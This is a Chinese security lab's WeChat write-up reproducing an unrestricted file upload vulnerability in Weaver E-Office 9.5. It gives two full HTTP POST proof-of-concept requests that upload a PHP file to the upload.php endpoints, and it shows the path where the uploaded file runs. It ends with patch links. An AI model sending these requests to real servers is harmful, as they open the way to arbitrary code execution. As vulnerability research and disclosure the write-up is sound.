> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/F3pvaEGoMUYteEgkO2UlJw)

  

网安引领时代，弥天点亮未来   

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x00 写在前面**  

  

**本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！**

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x01 漏洞介绍**  

Weaver E-Office 是中国泛微科技（Weaver）公司的一个协同办公系统。

Weaver E-Office 9.5 版本存在代码问题漏洞，该漏洞源于文件 /webservice/upload/upload.php 和 /webservice/upload.php 存在问题，对参数 Filedata 的操作会导致不受限制的上传。

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCr0Z5PWtibbNSRyRjDXywzyLjce9WqkZ1shnESYfP2wQGYf6VYAagCfe3ia4PCaRNXBx12H0A5Mk3A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x02 影响版本**  

  

Weaver E-Office 9.5 版本

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x03 漏洞复现**  

  

1. 部署漏洞环境访问

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hAIrqk2zMuQ25CibicZgeDYsbTprmy4g99pVrgeegOk4l4WW2LHiaDdpOhyl72A5DuiaSk1PFBQzbcR2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

2. 对漏洞进行复现

 **Poc （POST）**

 **路径 1 /webservice/upload/upload.php**

```
POST /webservice/upload/upload.php HTTP/1.1
Host: 10.211.55.3:8082
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: USER_NAME_COOKIE=admin; LOGIN_LANG=cn
Connection: keep-alive
Content-Type: multipart/form-data; boundary=---------------------------10267625012906
Content-Length: 208
-----------------------------10267625012906
Content-Disposition: form-data; 
Content-Type: application/php
<?php echo md5(43856);unlink(__FILE__);?>
-----------------------------10267625012906--

```

漏洞复现

POST 请求，响应存在漏洞

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCr0Z5PWtibbNSRyRjDXywzyH2vszOpIIzLWnWBDO3LBia8nKuD5fpT88AgXPtS23bibXnCxibggOCNXg/640?wx_fmt=png)

        解析 php 文件 

```
http://10.211.55.3:8082/attachment/870392248/pufh.php4

```

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCr0Z5PWtibbNSRyRjDXywzy06hxjKsCibotbnrds1bGTtV4eGAhaC2iaYTJET6k0mBPRLOQOBaq3bZQ/640?wx_fmt=png)

**路径 2 /webservice/upload.php**

```
POST /webservice/upload.php HTTP/1.1
Host: 10.211.55.3:8082
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36
Content-Length: 220
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryakbyiukl
Accept-Encoding: gzip
Connection: close
------WebKitFormBoundaryakbyiukl
Content-Disposition: form-data; 
Content-Type: application/octet-stream
<?php echo md5(43856);unlink(__FILE__);?>
------WebKitFormBoundaryakbyiukl--

```

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCr0Z5PWtibbNSRyRjDXywzyTXAvqMFNtFEJHaEXFV7nvib3yj6iaLQwYnX07Kia7x7eXAoKVux7rc3Ag/640?wx_fmt=png)

解析解 php 文件 

```
http://10.211.55.3:8082/attachment/2085157518/pufh.php4

```

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCr0Z5PWtibbNSRyRjDXywzykxQmuMwibK6hAUQiaCdMicjicFR5WRrJTOLOW0nmYI3VB3LYIszFdUVZxw/640?wx_fmt=png)

流量情况

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCr0Z5PWtibbNSRyRjDXywzyVAjEmsYn77JsOTdj6w9JWXA1ptwqWHp2MbuwicHxbCdVYfzPWGlNl8Q/640?wx_fmt=png)

3.afrog_2.6.0 工具测试（漏洞存在）上传测试文件。

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCr0Z5PWtibbNSRyRjDXywzy0zEneoGDgKcvcSP6q2J7bleJrbktJEalVTRBFrYSMI2SGQHSD1yguQ/640?wx_fmt=png)

4.Getshell 同泛微 E-Office 文件上传漏洞 (CVE-2023-2648) 操作，这里省略.......

[泛微 E-Office 文件上传漏洞 (CVE-2023-2648)](http://mp.weixin.qq.com/s?__biz=MzU2NDgzOTQzNw==&mid=2247498502&idx=1&sn=bb5ee3b680335c9deca30ab86ae5e4db&chksm=fc466e64cb31e772c654d6234e5b08316984047bbd4a4903e15a669703b14c3bc0ae8680bee1&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x04 修复建议**  

  

目前厂商已发布升级补丁以修复漏洞，补丁获取链接：

```
https://service.e-office.cn/download
https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0125592

```

弥天简介

学海浩茫，予以风动，必降弥天之润！弥天弥天安全实验室成立于 2019 年 2 月 19 日，主要研究安全防守溯源、威胁狩猎、漏洞复现、工具分享等不同领域。目前主要力量为民间白帽子，也是民间组织。主要以技术共享、交流等不断赋能自己，赋能安全圈，为网络安全发展贡献自己的微薄之力。

口号 网安引领时代，弥天点亮未来

![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaqjXT4YxgHVARD1NNv0RvKtiaAvXhmruVqgavPY3stwrfvLKetGycKUfxIq3Xc6F6dhU7eb4oh2gg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1) 

知识分享完了

喜欢别忘了关注我们哦~

学海浩茫，

予以风动，

必降弥天之润！

   弥  天

安全实验室  

![](https://mmbiz.qpic.cn/mmbiz_jpg/MjmKb3ap0hDyTJAqicycpl7ZakwfehdOgvOqd7bOUjVTdwxpfudPLOJcLiaSZnMC7pDDdlIF4TWBWWYnD04wX7uA/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)